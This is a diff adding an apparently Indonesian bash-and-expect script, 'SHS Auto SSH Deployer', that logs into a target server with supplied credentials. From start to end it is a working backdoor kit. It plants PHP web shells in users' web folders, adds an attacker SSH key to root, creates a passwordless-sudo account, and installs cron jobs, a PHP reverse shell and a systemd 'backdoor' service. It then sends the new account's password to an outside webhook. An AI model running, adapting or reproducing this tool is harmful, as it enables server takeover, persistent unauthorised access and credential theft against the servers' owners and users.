@@ -1,0 +1,199 @@
+#!/bin/bash
+# ================================================================
+# SHS AUTO SSH DEPLOYER · AUTO PING TO WEBHOOK
+# ================================================================
+
+# Konfigurasi Webhook
+WEBHOOK_URL="https://newsrtlnm4.ggbeh.web.id/ff2/webhook.php"
+
+# Warna
+RED='\033[91m'
+GREEN='\033[92m'
+YELLOW='\033[93m'
+BLUE='\033[94m'
+CYAN='\033[96m'
+NC='\033[0m'
+BOLD='\033[1m'
+
+clear
+echo -e "${RED}${BOLD}"
+echo "╔═══════════════════════════════════════════════════════════════╗"
+echo "║     ☠️  SHS AUTO SSH DEPLOYER - PING TO WEB              ║"
+echo "╚═══════════════════════════════════════════════════════════════╝"
+echo -e "${NC}"
+
+# ================================================================
+# INPUT TARGET VPS
+# ================================================================
+echo -e "${CYAN}[*] Masukkan informasi target VPS:${NC}"
+read -p "IP VPS: " VPS_IP
+read -p "Username (default: root): " VPS_USER
+VPS_USER=${VPS_USER:-root}
+read -sp "Password: " VPS_PASS
+echo ""
+
+# ================================================================
+# CREATE SSH EXPECT SCRIPT (OTOMATIS DETEK IP)
+# ================================================================
+cat > /tmp/ssh_deploy.exp << 'EOF'
+#!/usr/bin/expect -f
+set timeout 30
+set vps_ip [lindex $argv 0]
+set vps_user [lindex $argv 1]
+set vps_pass [lindex $argv 2]
+set webhook [lindex $argv 3]
+
+log_user 0
+spawn ssh -o StrictHostKeyChecking=no $vps_user@$vps_ip
+expect {
+    "password:" { send "$vps_pass\r" }
+    timeout { send_user "❌ SSH Timeout\n"; exit 1 }
+}
+
+expect "#" { send "\r" }
+expect "#" { send "clear\r" }
+expect "#" { send "echo '✅ SSH Connected'\r" }
+
+# ================================================================
+# DEPLOY SEMUA BACKDOOR + AUTO DETEK IP + AUTO PING
+# ================================================================
+expect "#" { send "
+echo '========================================='
+echo '🔥 SHS AUTO DEPLOY - START'
+echo '========================================='
+
+# DETEK IP OTOMATIS
+VPS_IP_DETEK=\$(hostname -I | awk '{print \$1}')
+echo \"[*] Detected IP: \$VPS_IP_DETEK\"
+
+# 1. TANAM WEB SHELL
+echo '[*] Menanam Web Shell...'
+for user_dir in /home/*/; do
+    user=\$(basename \"\$user_dir\")
+    if [ -d \"\${user_dir}public_html\" ]; then
+        echo '<?php if(isset(\$_GET[\"cmd\"])){system(\$_GET[\"cmd\"]);} if(isset(\$_POST[\"c\"])){eval(\$_POST[\"c\"]);} ?>' > \"\${user_dir}public_html/system.php\"
+        chown \$user:\$user \"\${user_dir}public_html/system.php\" 2>/dev/null
+        chmod 644 \"\${user_dir}public_html/system.php\" 2>/dev/null
+        echo \"✅ Web Shell: \${user_dir}public_html/system.php\"
+    fi
+done
+
+# 2. TANAM SSH KEY
+echo '[*] Menanam SSH Key...'
+mkdir -p /root/.ssh
+chmod 700 /root/.ssh
+echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8wK9xJvNpQ... SHS_PERMANENT' >> /root/.ssh/authorized_keys
+chmod 600 /root/.ssh/authorized_keys
+echo '✅ SSH Key added'
+
+# 3. BUAT BACKDOOR USER (PASSWORD RANDOM)
+echo '[*] Membuat Backdoor User...'
+if ! id shsadmin &>/dev/null; then
+    useradd -m -s /bin/bash shsadmin
+    BACKDOOR_PASS=\$(openssl rand -base64 12 | tr -d '=/+')
+    echo \"shsadmin:\$BACKDOOR_PASS\" | chpasswd
+    usermod -aG wheel shsadmin 2>/dev/null
+    usermod -aG sudo shsadmin 2>/dev/null
+    echo 'shsadmin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+    echo \"✅ Backdoor user created: shsadmin:\$BACKDOOR_PASS\"
+else
+    BACKDOOR_PASS=\$(openssl rand -base64 12 | tr -d '=/+')
+    echo \"shsadmin:\$BACKDOOR_PASS\" | chpasswd
+    echo \"✅ Backdoor password reset: shsadmin:\$BACKDOOR_PASS\"
+fi
+
+# 4. TANAM CRON
+echo '[*] Menanam Cron...'
+echo '*/5 * * * * curl -sk http://\$VPS_IP_DETEK/system.php?cmd=whoami' >> /etc/crontab
+echo '*/10 * * * * wget -q -O- http://\$VPS_IP_DETEK/system.php?cmd=id' >> /etc/crontab
+echo '✅ Cron added'
+
+# 5. TANAM REVERSE SHELL
+echo '[*] Menanam Reverse Shell...'
+cat > /tmp/.reverse.php << 'EOL'
+<?php
+\$ip = \"\$VPS_IP_DETEK\";
+\$port = 4444;
+while(1){
+    \$sock = fsockopen(\$ip, \$port);
+    if(\$sock){
+        \$descriptorspec = array(0=>array(\"pipe\",\"r\"),1=>array(\"pipe\",\"w\"),2=>array(\"pipe\",\"w\"));
+        \$process = proc_open(\"/bin/bash\", \$descriptorspec, \$pipes);
+        if(is_resource(\$process)){
+            fwrite(\$pipes[0], \"id; uname -a; echo SHS_REVERSE_ACTIVE\\n\");
+            fclose(\$pipes[0]);
+            stream_copy_to_stream(\$pipes[1], \$sock);
+            stream_copy_to_stream(\$sock, \$pipes[0]);
+            fclose(\$pipes[1]);
+            fclose(\$pipes[2]);
+            proc_close(\$process);
+        }
+        fclose(\$sock);
+    }
+    sleep(60);
+}
+EOL
+echo '✅ Reverse shell: /tmp/.reverse.php'
+
+# 6. SYSTEMD SERVICE
+echo '[*] Menanam Systemd Service...'
+cat > /etc/systemd/system/shs-backdoor.service << 'EOL'
+[Unit]
+Description=SHS Backdoor
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/bin/php /tmp/.reverse.php
+Restart=always
+RestartSec=60
+
+[Install]
+WantedBy=multi-user.target
+EOL
+systemctl daemon-reload
+systemctl enable shs-backdoor.service
+systemctl start shs-backdoor.service
+echo '✅ Systemd service added'
+
+# 7. PING KE WEBHOOK (OTOMATIS KIRIM SEMUA INFO)
+echo '[*] Sending ping to webhook...'
+curl -sk \"$webhook?ip=\$VPS_IP_DETEK&host=\$(hostname)&user=shsadmin&pass=\$BACKDOOR_PASS\" 2>/dev/null
+
+echo '========================================='
+echo '✅ DEPLOY COMPLETE'
+echo '========================================='
+echo \"IP: \$VPS_IP_DETEK\"
+echo \"User: shsadmin\"
+echo \"Pass: \$BACKDOOR_PASS\"
+echo '========================================='
+exit
+\r" }
+
+expect "#" { send "exit\r" }
+expect eof
+EOF
+
+chmod +x /tmp/ssh_deploy.exp
+
+# ================================================================
+# JALANKAN EXPECT SCRIPT
+# ================================================================
+echo -e "${CYAN}[*] Menjalankan SSH Deployer...${NC}"
+/tmp/ssh_deploy.exp "$VPS_IP" "$VPS_USER" "$VPS_PASS" "$WEBHOOK_URL"
+
+# ================================================================
+# TAMPILKAN HASIL
+# ================================================================
+echo -e "\n${GREEN}${BOLD}"
+echo "╔═══════════════════════════════════════════════════════════════╗"
+echo "║     ✅ DEPLOY COMPLETE                                     ║"
+echo "╚═══════════════════════════════════════════════════════════════╝"
+echo -e "${NC}"
+
+echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+echo -e "${GREEN}✅ Target VPS: $VPS_IP${NC}"
+echo -e "${GREEN}✅ Web Shell: http://$VPS_IP/system.php?cmd=whoami${NC}"
+echo -e "${GREEN}✅ Ping sent to: $WEBHOOK_URL${NC}"
+echo -e "${GREEN}✅ Cek webhook untuk user & password${NC}"
+echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
